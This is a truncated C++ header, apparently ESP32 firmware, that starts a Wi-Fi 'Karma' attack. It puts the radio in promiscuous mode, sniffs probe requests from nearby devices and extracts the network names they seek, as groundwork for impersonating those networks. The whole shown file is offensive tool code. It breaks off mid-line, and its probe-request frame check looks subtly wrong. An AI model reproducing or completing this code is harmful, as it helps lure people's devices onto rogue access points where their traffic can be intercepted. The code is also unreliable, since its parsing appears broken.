// karma.h
#ifndef KARMA_H
#define KARMA_H

#include <esp_wifi.h>
#include <vector>

bool karmaActive = false;
std::vector<String> seenProbes;

void startKarmaAttack() {
  karmaActive = true;
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb([](void* buf, wifi_promiscuous_pkt_type_t type) {
    if (!karmaActive) return;
    if (type != WIFI_PKT_MGMT) return;
    
    wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
    uint8_t* payload = pkt->payload;
    uint8_t frameType = payload[0] & 0x0C;
    
    // Probe request (type 0x04)
    if (frameType == 0x04) {
      // Extract SSID from probe request
      int tagStart = 24;  // Fixed fields + addresses
      while (tagStart < pkt->rx_ctrl.sig_len) {
        uint8_t tag = payload[tagStart];
        uint8_t len = payload[tagStart + 1];
        if (tag == 0x00 && len > 0) {  // SSID
          String ssid;
          for (int i = 0; i < len; i++) {
            ssid += (char)payload[tagStart + 2 + i];
          }
          if (ssid.length() > 
